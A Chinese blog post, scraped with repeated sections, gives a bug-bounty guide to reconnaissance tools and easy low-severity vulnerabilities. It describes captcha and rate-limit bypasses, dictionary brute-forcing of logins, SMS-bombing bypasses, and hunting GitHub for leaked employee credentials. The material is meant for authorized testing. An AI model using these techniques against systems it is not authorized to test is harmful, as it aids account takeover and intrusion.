Goby官网:https://gobies.org/ 因为之前一直在用masscan+nmap的方式进行端口扫描，用这个项目:https://github.com/hellogoldsnakeman/masnmapscan-V1.0 前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。 因为在实际的端口扫描过程，由于cdn或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到22端口开放时，说明这个ip没有cdn保护，对于这种ip我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。 BBScan猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测C段下面的很多资产，扩充攻击面。 项目地址: https://github.com/lijiejie/BBScan https://github.com/yhy0/BBScan （添加了springboot的泄露探测） 可以对域名、ip、C段进行探测 快速探测管理后台 进行端口探测 探测敏感信息泄露 可以自定义扫描规则 report下看报告,误报肯定会很多，但C段下很可能会有意想不到的资产。 js信息收集主要是爬取网站的敏感js文件，js中能收集到的信息: 增加攻击面(url、域名) 敏感信息(密码、API密钥、加密方式) 代码中的潜在危险函数操作 具有已知漏洞的框架 常用的工具 速度很快的jsfinder https://github.com/Threezh1/JSFinder xray的rad爬虫 https://github.com/chaitin/rad 能够匹配敏感信息的JSINFO-SCAN：https://github.com/p1g3/JSINFO-SCAN ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:1","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#goby"},{"categories":["学习"],"content":" 前期信息收集还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。 企业相关信息收集 企查查 (https://www.qcc.com）/) 天眼查(https://www.tianyancha.com/) 启信宝（https://www.qixin.com/) 企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。 主要查询的信息: 一般大的src都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。 查看同电话企业基本都是子公司。 查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。 查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产) PS:一般来说100%的全资子公司src漏洞是一定会收的，其他子公司资产可能需要与src审核沟通（扯皮)。 站长之家:http://whois.chinaz.com/ 邮箱反查、注册人反查、电话反查。 推荐个项目:https://github.com/code-scan/BroDomain 兄弟域名查询。 https://www.qimai.cn/ 七麦数据，可以查到企业下一些比较冷门的app。 信息整理 当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息 主公司及分公司、子公司下所有归属的网站域名信息； 主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。 主公司及分公司、子公司下所有的app资产和微信小程序。 之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。 子域名收集和网站信息收集子域名的话，对于我来说oneforall和xray的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是layer子域名挖掘机不错。 通过github收集子域名先分享一个姿势，很多时候github上已经有热心的师傅分享了自己跑出的子域名，所以可以先到github找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。 oneforAllhttps://github.com/shmilylty/OneForAll 需要到配置文件里填写api接口信息， 根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。 命令 python oneforall.py --targets ./domain.txt run python oneforall.py --targets ./domain.txt --brute true run 我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。 xray子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码， https://github.com/timwhitez/rad-xray 命令改一下能批量探测子域名，一般5到10分钟一个子域。 Goby官网:https://gobies.org/ 因为之前一直在用masscan+nmap的方式进行端口扫描，用这个项目:https://github.com/hellogoldsnakeman/masnmapscan-V1.0 前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。 因为在实际的端口扫描过程，由于cdn或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到22端口开放时，说明这个ip没有cdn保护，对于这种ip我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。 BBScan猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测C段下面的很多资产，扩充攻击面。 项目地址: https://github.com/lijiejie/BBScan https://github.com/yhy0/BBScan （添加了springboot的泄露探测） 可以对域名、ip、C段进行探测 快速探测管理后台 进行端口探测 探测敏感信息泄露 可以自定义扫描规则 report下看报告,误报肯定会很多，但C段下很可能会有意想不到的资产。 js信息收集主要是爬取网站的敏感js文件，js中能收集到的信息: 增加攻击面(url、域名) 敏感信息(密码、API密钥、加密方式) 代码中的潜在危险函数操作 具有已知漏洞的框架 常用的工具 速度很快的jsfinder https://github.com/Threezh1/JSFinder xray的rad爬虫 https://github.com/chaitin/rad 能够匹配敏感信息的JSINFO-SCAN：https://github.com/p1g3/JSINFO-SCAN ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:1","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#bbscan"},{"categories":["学习"],"content":" 前期信息收集还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。 企业相关信息收集 企查查 (https://www.qcc.com）/) 天眼查(https://www.tianyancha.com/) 启信宝（https://www.qixin.com/) 企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。 主要查询的信息: 一般大的src都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。 查看同电话企业基本都是子公司。 查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。 查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产) PS:一般来说100%的全资子公司src漏洞是一定会收的，其他子公司资产可能需要与src审核沟通（扯皮)。 站长之家:http://whois.chinaz.com/ 邮箱反查、注册人反查、电话反查。 推荐个项目:https://github.com/code-scan/BroDomain 兄弟域名查询。 https://www.qimai.cn/ 七麦数据，可以查到企业下一些比较冷门的app。 信息整理 当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息 主公司及分公司、子公司下所有归属的网站域名信息； 主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。 主公司及分公司、子公司下所有的app资产和微信小程序。 之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。 子域名收集和网站信息收集子域名的话，对于我来说oneforall和xray的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是layer子域名挖掘机不错。 通过github收集子域名先分享一个姿势，很多时候github上已经有热心的师傅分享了自己跑出的子域名，所以可以先到github找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。 oneforAllhttps://github.com/shmilylty/OneForAll 需要到配置文件里填写api接口信息， 根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。 命令 python oneforall.py --targets ./domain.txt run python oneforall.py --targets ./domain.txt --brute true run 我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。 xray子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码， https://github.com/timwhitez/rad-xray 命令改一下能批量探测子域名，一般5到10分钟一个子域。 Goby官网:https://gobies.org/ 因为之前一直在用masscan+nmap的方式进行端口扫描，用这个项目:https://github.com/hellogoldsnakeman/masnmapscan-V1.0 前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。 因为在实际的端口扫描过程，由于cdn或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到22端口开放时，说明这个ip没有cdn保护，对于这种ip我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。 BBScan猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测C段下面的很多资产，扩充攻击面。 项目地址: https://github.com/lijiejie/BBScan https://github.com/yhy0/BBScan （添加了springboot的泄露探测） 可以对域名、ip、C段进行探测 快速探测管理后台 进行端口探测 探测敏感信息泄露 可以自定义扫描规则 report下看报告,误报肯定会很多，但C段下很可能会有意想不到的资产。 js信息收集主要是爬取网站的敏感js文件，js中能收集到的信息: 增加攻击面(url、域名) 敏感信息(密码、API密钥、加密方式) 代码中的潜在危险函数操作 具有已知漏洞的框架 常用的工具 速度很快的jsfinder https://github.com/Threezh1/JSFinder xray的rad爬虫 https://github.com/chaitin/rad 能够匹配敏感信息的JSINFO-SCAN：https://github.com/p1g3/JSINFO-SCAN ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:1","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#js信息收集"},{"categories":["学习"],"content":" 捡中低危漏洞的一些技巧刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。 框架注入 明文密码传输 表单破解漏洞 IIS短文件名泄露 老旧过期的HTTPS服务 跨目录下载漏洞 目录可浏览漏洞 LFI本地文件包含漏洞 RFI远程文件包含漏洞 HTTP拒绝服务攻击 弱口令登录 CSRF跨站点请求伪造 Flash点击劫持 SQL注入漏洞 XSS跨站脚本漏洞 文件上传漏洞 解析漏洞:IIS解析漏洞 解析漏洞:Apache解析漏洞 Cookies注入漏洞 越权访问漏洞 命令执行漏洞 Struts2远程代码执行漏洞 业务逻辑漏洞 用户隐私泄露 敏感信息泄漏(运维) 敏感信息泄漏(研发) 敏感文件泄漏(运维)(配置) 敏感文件泄漏(运维)(权限) 未验证的重定向和传递 Flash跨域访问资源 测试文件泄漏 开启危险的HTTP方法 HTTP参数污染 Unicode编码绕过 源码泄漏 后台目录泄漏 链接注入漏洞 SSRF服务器请求伪造 jsonp劫持 学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。 乌云漏洞库:https://wooyun.x10sec.org/ hackone报告：https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA 提取码:2klt 这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。 登录框处常见的一些漏洞在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。 现在还能用的接码平台: http://www.114sim.com/ https://yunduanxin.net/China-Phone-Number/ https://www.materialtools.com/ 绕过限制导致的爆破、撞库、用户遍历漏洞最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势: 验证码不刷新 验证码抓包绕过 验证码删除绕过 验证码置空绕过 修改xff头绕过:推荐个burp插件,https://github.com/TheKingOfDuck/burpFakeIP 账号后加空格绕过账号错误次数限制。 一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。 弱口令漏洞没有验证码或者验证码可以绕过的情况 直接上一手字典爆破，当然还是有一些小技巧: 比如可以设置固定的弱密码，比如123456，然后爆破账号。 比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool 爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章: https://xz.aliyun.com/t/7823 https://github.com/huyuanzhi2/password_brute_dictionary 有验证码且无法绕过的情况 github直接找员工账号邮箱，密码。 源码或者js文件查找线索，邮箱，或者加密的账号密码。 特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。 手动尝试常见弱口令。 注册、登录、找回密码处的短信\\邮箱轰炸漏洞这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势: 加空格绕过 加任意字母绕过 前面加86绕过 xff头伪造ip绕过 逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候 类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大: https://www.freebuf.com/author/yangyangwithgnu 常见的信息泄露漏洞敏感信息泄露的范围很广，我认为一般就是两大类， 因为配置错误或者管理不当导致的企业内部信息泄露。 因为逻辑缺陷导致的用户资料泄露(遍历)。 github导致的信息泄露 P牛知识星球里分享的github搜索关键词:https://twitter.com/obheda12/status/1316513838716551169 github子域名监控项目:https://github.com/FeeiCN/GSIL 常见的泄露内容: 员工内部邮箱、登录账号、密码。 企业的一些内部系统域名、ip泄露。 企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。 乌云上有一些案例，可以看一看。 配置错误导致的信息泄露包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。 我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描 比如: 备份文件的小字典 springboot泄露的小字典 网站后台的小字典 比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。 可视化的比如TEST404系列、御剑扫描器使用体验也不错。 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。 越权导致的信息泄露很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。 推荐几个burp插件: 未授权检测： https://github.com/theLSA/burp-unauth-checker 敏感参数提取：https://github.com/theLSA/burp-sensitive-param-extractor 信息提取：https://github.com/theLSA/burp-info-extractor 插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。 常见的一些越权情况: 基于用户ID的越权 基于功能对象ID的越权 基于上传对象ID的越权 基于未授权访问的越权 基于功能地址的越权 基于接口身份的越权 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:2","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#捡中低危漏洞的一些技巧"},{"categories":["学习"],"content":" 捡中低危漏洞的一些技巧刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。 框架注入 明文密码传输 表单破解漏洞 IIS短文件名泄露 老旧过期的HTTPS服务 跨目录下载漏洞 目录可浏览漏洞 LFI本地文件包含漏洞 RFI远程文件包含漏洞 HTTP拒绝服务攻击 弱口令登录 CSRF跨站点请求伪造 Flash点击劫持 SQL注入漏洞 XSS跨站脚本漏洞 文件上传漏洞 解析漏洞:IIS解析漏洞 解析漏洞:Apache解析漏洞 Cookies注入漏洞 越权访问漏洞 命令执行漏洞 Struts2远程代码执行漏洞 业务逻辑漏洞 用户隐私泄露 敏感信息泄漏(运维) 敏感信息泄漏(研发) 敏感文件泄漏(运维)(配置) 敏感文件泄漏(运维)(权限) 未验证的重定向和传递 Flash跨域访问资源 测试文件泄漏 开启危险的HTTP方法 HTTP参数污染 Unicode编码绕过 源码泄漏 后台目录泄漏 链接注入漏洞 SSRF服务器请求伪造 jsonp劫持 学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。 乌云漏洞库:https://wooyun.x10sec.org/ hackone报告：https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA 提取码:2klt 这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。 登录框处常见的一些漏洞在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。 现在还能用的接码平台: http://www.114sim.com/ https://yunduanxin.net/China-Phone-Number/ https://www.materialtools.com/ 绕过限制导致的爆破、撞库、用户遍历漏洞最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势: 验证码不刷新 验证码抓包绕过 验证码删除绕过 验证码置空绕过 修改xff头绕过:推荐个burp插件,https://github.com/TheKingOfDuck/burpFakeIP 账号后加空格绕过账号错误次数限制。 一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。 弱口令漏洞没有验证码或者验证码可以绕过的情况 直接上一手字典爆破，当然还是有一些小技巧: 比如可以设置固定的弱密码，比如123456，然后爆破账号。 比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool 爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章: https://xz.aliyun.com/t/7823 https://github.com/huyuanzhi2/password_brute_dictionary 有验证码且无法绕过的情况 github直接找员工账号邮箱，密码。 源码或者js文件查找线索，邮箱，或者加密的账号密码。 特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。 手动尝试常见弱口令。 注册、登录、找回密码处的短信\\邮箱轰炸漏洞这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势: 加空格绕过 加任意字母绕过 前面加86绕过 xff头伪造ip绕过 逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候 类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大: https://www.freebuf.com/author/yangyangwithgnu 常见的信息泄露漏洞敏感信息泄露的范围很广，我认为一般就是两大类， 因为配置错误或者管理不当导致的企业内部信息泄露。 因为逻辑缺陷导致的用户资料泄露(遍历)。 github导致的信息泄露 P牛知识星球里分享的github搜索关键词:https://twitter.com/obheda12/status/1316513838716551169 github子域名监控项目:https://github.com/FeeiCN/GSIL 常见的泄露内容: 员工内部邮箱、登录账号、密码。 企业的一些内部系统域名、ip泄露。 企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。 乌云上有一些案例，可以看一看。 配置错误导致的信息泄露包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。 我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描 比如: 备份文件的小字典 springboot泄露的小字典 网站后台的小字典 比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。 可视化的比如TEST404系列、御剑扫描器使用体验也不错。 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。 越权导致的信息泄露很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。 推荐几个burp插件: 未授权检测： https://github.com/theLSA/burp-unauth-checker 敏感参数提取：https://github.com/theLSA/burp-sensitive-param-extractor 信息提取：https://github.com/theLSA/burp-info-extractor 插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。 常见的一些越权情况: 基于用户ID的越权 基于功能对象ID的越权 基于上传对象ID的越权 基于未授权访问的越权 基于功能地址的越权 基于接口身份的越权 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:2","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#登录框处常见的一些漏洞"},{"categories":["学习"],"content":" 捡中低危漏洞的一些技巧刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。 框架注入 明文密码传输 表单破解漏洞 IIS短文件名泄露 老旧过期的HTTPS服务 跨目录下载漏洞 目录可浏览漏洞 LFI本地文件包含漏洞 RFI远程文件包含漏洞 HTTP拒绝服务攻击 弱口令登录 CSRF跨站点请求伪造 Flash点击劫持 SQL注入漏洞 XSS跨站脚本漏洞 文件上传漏洞 解析漏洞:IIS解析漏洞 解析漏洞:Apache解析漏洞 Cookies注入漏洞 越权访问漏洞 命令执行漏洞 Struts2远程代码执行漏洞 业务逻辑漏洞 用户隐私泄露 敏感信息泄漏(运维) 敏感信息泄漏(研发) 敏感文件泄漏(运维)(配置) 敏感文件泄漏(运维)(权限) 未验证的重定向和传递 Flash跨域访问资源 测试文件泄漏 开启危险的HTTP方法 HTTP参数污染 Unicode编码绕过 源码泄漏 后台目录泄漏 链接注入漏洞 SSRF服务器请求伪造 jsonp劫持 学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。 乌云漏洞库:https://wooyun.x10sec.org/ hackone报告：https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA 提取码:2klt 这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。 登录框处常见的一些漏洞在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。 现在还能用的接码平台: http://www.114sim.com/ https://yunduanxin.net/China-Phone-Number/ https://www.materialtools.com/ 绕过限制导致的爆破、撞库、用户遍历漏洞最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势: 验证码不刷新 验证码抓包绕过 验证码删除绕过 验证码置空绕过 修改xff头绕过:推荐个burp插件,https://github.com/TheKingOfDuck/burpFakeIP 账号后加空格绕过账号错误次数限制。 一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。 弱口令漏洞没有验证码或者验证码可以绕过的情况 直接上一手字典爆破，当然还是有一些小技巧: 比如可以设置固定的弱密码，比如123456，然后爆破账号。 比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool 爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章: https://xz.aliyun.com/t/7823 https://github.com/huyuanzhi2/password_brute_dictionary 有验证码且无法绕过的情况 github直接找员工账号邮箱，密码。 源码或者js文件查找线索，邮箱，或者加密的账号密码。 特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。 手动尝试常见弱口令。 注册、登录、找回密码处的短信\\邮箱轰炸漏洞这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势: 加空格绕过 加任意字母绕过 前面加86绕过 xff头伪造ip绕过 逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候 类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大: https://www.freebuf.com/author/yangyangwithgnu 常见的信息泄露漏洞敏感信息泄露的范围很广，我认为一般就是两大类， 因为配置错误或者管理不当导致的企业内部信息泄露。 因为逻辑缺陷导致的用户资料泄露(遍历)。 github导致的信息泄露 P牛知识星球里分享的github搜索关键词:https://twitter.com/obheda12/status/1316513838716551169 github子域名监控项目:https://github.com/FeeiCN/GSIL 常见的泄露内容: 员工内部邮箱、登录账号、密码。 企业的一些内部系统域名、ip泄露。 企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。 乌云上有一些案例，可以看一看。 配置错误导致的信息泄露包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。 我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描 比如: 备份文件的小字典 springboot泄露的小字典 网站后台的小字典 比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。 可视化的比如TEST404系列、御剑扫描器使用体验也不错。 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。 越权导致的信息泄露很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。 推荐几个burp插件: 未授权检测： https://github.com/theLSA/burp-unauth-checker 敏感参数提取：https://github.com/theLSA/burp-sensitive-param-extractor 信息提取：https://github.com/theLSA/burp-info-extractor 插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。 常见的一些越权情况: 基于用户ID的越权 基于功能对象ID的越权 基于上传对象ID的越权 基于未授权访问的越权 基于功能地址的越权 基于接口身份的越权 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:2","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#绕过限制导致的爆破撞库用户遍历漏洞"},{"categories":["学习"],"content":" 捡中低危漏洞的一些技巧刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。 框架注入 明文密码传输 表单破解漏洞 IIS短文件名泄露 老旧过期的HTTPS服务 跨目录下载漏洞 目录可浏览漏洞 LFI本地文件包含漏洞 RFI远程文件包含漏洞 HTTP拒绝服务攻击 弱口令登录 CSRF跨站点请求伪造 Flash点击劫持 SQL注入漏洞 XSS跨站脚本漏洞 文件上传漏洞 解析漏洞:IIS解析漏洞 解析漏洞:Apache解析漏洞 Cookies注入漏洞 越权访问漏洞 命令执行漏洞 Struts2远程代码执行漏洞 业务逻辑漏洞 用户隐私泄露 敏感信息泄漏(运维) 敏感信息泄漏(研发) 敏感文件泄漏(运维)(配置) 敏感文件泄漏(运维)(权限) 未验证的重定向和传递 Flash跨域访问资源 测试文件泄漏 开启危险的HTTP方法 HTTP参数污染 Unicode编码绕过 源码泄漏 后台目录泄漏 链接注入漏洞 SSRF服务器请求伪造 jsonp劫持 学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。 乌云漏洞库:https://wooyun.x10sec.org/ hackone报告：https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA 提取码:2klt 